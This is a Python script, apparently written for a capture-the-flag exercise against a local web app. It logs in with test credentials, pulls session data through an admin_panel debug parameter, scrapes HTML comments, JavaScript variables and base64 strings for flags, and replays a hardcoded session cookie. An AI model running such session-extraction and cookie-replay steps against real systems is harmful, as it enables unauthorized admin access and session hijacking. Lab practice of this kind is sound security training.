import requests
import re
import json
import base64

base_url = "http://127.0.0.1:32831"

print("=" * 80)
print("COMPREHENSIVE SESSION DATA EXTRACTION")
print("=" * 80)

# Clear any existing session
session = requests.Session()

# Login and capture all response details
login_data = {"username": "test", "password": "test"}
print("[+] Logging in with test:test")
login_resp = session.post(f"{base_url}/login", data=login_data, allow_redirects=False)

print(f"[+] Login status: {login_resp.status_code}")
print(f"[+] Login headers:\n{dict(login_resp.headers)}")
print(f"[+] Login response body:\n{login_resp.text[:500]}")
print(f"[+] Session cookies after login: {dict(session.cookies)}")

# Check if there's a redirect
if login_resp.status_code in [301, 302, 303, 307, 308]:
    redirect_url = login_resp.headers.get('Location')
    print(f"[+] Login redirect to: {redirect_url}")
    
    # Follow redirect
    redirect_resp = session.get(f"{base_url}{redirect_url}")
    print(f"[+] After redirect status: {redirect_resp.status_code}")
    print(f"[+] After redirect body (first 1000 chars):\n{redirect_resp.text[:1000]}")
else:
    # Check the login response itself
    print(f"[+] Login response body (first 1000 chars):\n{login_resp.text[:1000]}")

# Now access admin_panel with and without debug
print("\n" + "=" * 80)
print("ACCESSING ADMIN PANEL - DETAILED ANALYSIS")
print("=" * 80)

# Access without debug
admin_normal = session.get(f"{base_url}/admin_panel")
print(f"\n[+] /admin_panel (no debug) - Status: {admin_normal.status_code}")
print(f"[-] Full response:\n{admin_normal.text}")

# Access with debug - this should expose session data
admin_debug = session.get(f"{base_url}/admin_panel?debug=session")
print(f"\n[+] /admin_panel?debug=session - Status: {admin_debug.status_code}")
print(f"[-] Full response:\n{admin_debug.text}")

# Check if they're different
if admin_normal.text == admin_debug.text:
    print("\n[!] WARNING: Debug parameter didn't change content")
    print("[!] The session data may be already exposed or the parameter doesn't work")
else:
    print("\n[+] Debug parameter modified response as expected")
    print(f"[+] Difference detected - analyzing debug version")

# Extract ALL comments from both responses
normal_comments = re.findall(r'<!--(.*?)-->', admin_normal.text, re.DOTALL)
debug_comments = re.findall(r'<!--(.*?)-->', admin_debug.text, re.DOTALL)

print(f"\n[+] Normal view: {len(normal_comments)} comments")
print(f"[+] Debug view: {len(debug_comments)} comments")

# Print all debug comments in detail
print("\n" + "=" * 80)
print("ANALYZING DEBUG COMMENTS FOR SESSION DATA")
print("=" * 80)

for i, comment in enumerate(debug_comments):
    comment = comment.strip()
    if comment:
        print(f"\n[+] Comment {i+1}:")
        print(f"[-] Content: {comment[:500]}")
        
        # Look for specific session fields
        session_fields = ['username', 'password_hash', 'session_id', 'user_id', 'role', 'admin', 'privilege']
        found_in_comment = []
        
        for field in session_fields:
            if field in comment.lower() or field in comment:
                found_in_comment.append(field)
        
        if found_in_comment:
            print(f"[+] Session fields found: {found_in_comment}")
            
            # Try to extract structured data
            # Look for JSON patterns
            json_patterns = [
                r'\{[^}]*\}',  # Basic JSON object
                r'\[[^\]]*\]',  # Basic array
            ]
            
            for pattern in json_patterns:
                matches = re.findall(pattern, comment)
                for match in matches:
                    print(f"[+] Potential structured data: {match}")
                    try:
                        parsed = json.loads(match)
                        print(f"[+] PARSED SESSION DATA:")
                        for k, v in parsed.items():
                            if isinstance(v, str) and len(v) > 50:
                                print(f"  - {k}: {v[:50]}...")
                            else:
                                print(f"  - {k}: {v}")
                    except:
                        pass  # Not valid JSON
        
        # Search for flags directly in comment
        flags = re.findall(r'FLAG\{[^}]+\}', comment)
        if flags:
            print(f"[+] FLAG FOUND IN COMMENT: {flags[0]}")

# Search for hidden data in other parts of the page
print("\n" + "=" * 80)
print("TESTING HIDDEN DATA IN HTML")
print("=" * 80)

# Check for JavaScript variables that might contain session data
js_vars = re.findall(r'var\s+(\w+)\s*=\s*["\']([^"\']+)["\']', admin_debug.text)
for var_name, var_value in js_vars:
    if any(field in var_name.lower() for field in ['user', 'session', 'admin']):
        print(f"[+] JavaScript variable {var_name} = {var_value}")
        
        flags = re.findall(r'FLAG\{[^}]+\}', var_value)
        if flags:
            print(f"[+] FLAG FOUND in JS variable: {flags[0]}")

# Check for base64 encoded data
b64_pattern = r'[A-Za-z0-9+/]{30,}={0,2}'
b64_matches = re.findall(b64_pattern, admin_debug.text)
print(f"\n[+] Found {len(b64_matches)} potential base64 strings")

for i, b64_str in enumerate(b64_matches[:5]):  # Check first 5
    try:
        decoded = base64.b64decode(b64_str + '=' * (4 - len(b64_str) % 4))
        decoded_str = decoded.decode('utf-8', errors='ignore')
        print(f"[+] Base64 string {i+1} decodes to: {decoded_str[:200]}")
        
        flags = re.findall(r'FLAG\{[^}]+\}', decoded_str)
        if flags:
            print(f"[+] FLAG FOUND in base64: {flags[0]}")
    except Exception as e:
        pass

# Test if cookies are being set in a non-standard way
print("\n" + "=" * 80)
print("CHECKING FOR NON-STANDARD COOKIE MECHANISMS")
print("=" * 80)

# Look for Set-Cookie headers that might have been missed
print(f"[+] Set-Cookie headers in login:\n{login_resp.headers.get('Set-Cookie', 'None')}")
print(f"[+] All login response headers:\n{dict(login_resp.headers)}")

# Try to access with the session cookie from context (if different)
print("\n[+] Testing with provided session cookie value")
provided_session = "bMFJnxEasCAwKtSQf_pCAgeFx8Amw6DAqDFTsl_gHQY"

test_session = requests.Session()
test_session.cookies.set('session', provided_session, domain='127.0.0.1', path='/')

# Try accessing admin panel with provided session
admin_with_provided = test_session.get(f"{base_url}/admin_panel?debug=session")
print(f"[+] Using provided session - Status: {admin_with_provided.status_code}")
print(f"[-] Response:\n{admin_with_provided.text}")

# Check for session data in this response
provided_comments = re.findall(r'<!--(.*?)-->', admin_with_provided.text, re.DOTALL)
print(f"[+] Comments in provided session response: {len(provided_comments)}")

for i, comment in enumerate(provided_comments):
    comment = comment.strip()
    if comment:
        print(f"[+] Comment {i+1}: {comment[:300]}")
        if any(field in comment.lower() for field in ['username', 'password_hash', 'session_id', 'user_id']):
            print(f"[+] SESSION DATA DETECTED!")
        
        flags = re.findall(r'FLAG\{[^}]+\}', comment)
        if flags:
            print(f"[+] FLAG FOUND: {flags[0]}")

print("\n" + "=" * 80)
print("ANALYZING COMMENT FOR SESSION STRUCTURE")
print("=" * 80)

# Based on recon, we expect: username, password_hash, session_id, user_id
# Let's search the actual comment more carefully

if debug_comments:
    for comment in debug_comments:
        if 'TODO: Delete the testing account' in comment:
            print(f"[+] Found TODO comment as expected: {comment}")
            
            # According to recon, there should be session data including:
            # username, password_hash, session_id, user_id
            # Let's search more broadly in the HTML for this data
            print("\n" + "=" * 80)
            print("BROAD SEARCH FOR SESSION FIELDS IN HTML")
            print("=" * 80)
            
            fields_to_find = ['username', 'password_hash', 'session_id', 'user_id', 'role', 'admin', 'privilege']
            
            for field in fields_to_find:
                pattern = rf'{field}["\']?\s*[:=]\s*["\']?([^"\'\s]+)["\']?'
                matches = re.findall(pattern, admin_debug.text, re.IGNORECASE)
                if matches:
                    print(f"[+] Found {field}: {matches[0]}")

# Final comprehensive flag search
print("\n" + "=" * 80)
print("COMPREHENSIVE FLAG SEARCH IN ALL RESPONSES")
print("=" * 80)

for resp_name, resp in [("login", login_resp), ("admin_normal", admin_normal), ("admin_debug", admin_debug), ("admin_provided", admin_with_provided)]:
    if resp.text:
        flags = re.findall(r'FLAG\{[^}]+\}', resp.text)
        if flags:
            print(f"[+] FLAG FOUND in {resp_name}: {flags[0]}")
        else:
            print(f"[-] No flag in {resp_name}")
            
        # Check comments specifically
        comments = re.findall(r'<!--(.*?)-->', resp.text, re.DOTALL)
        for comment in comments:
            flags = re.findall(r'FLAG\{[^}]+\}', comment)
            if flags:
                print(f"[+] FLAG FOUND in {resp_name} comment: {flags[0]}")

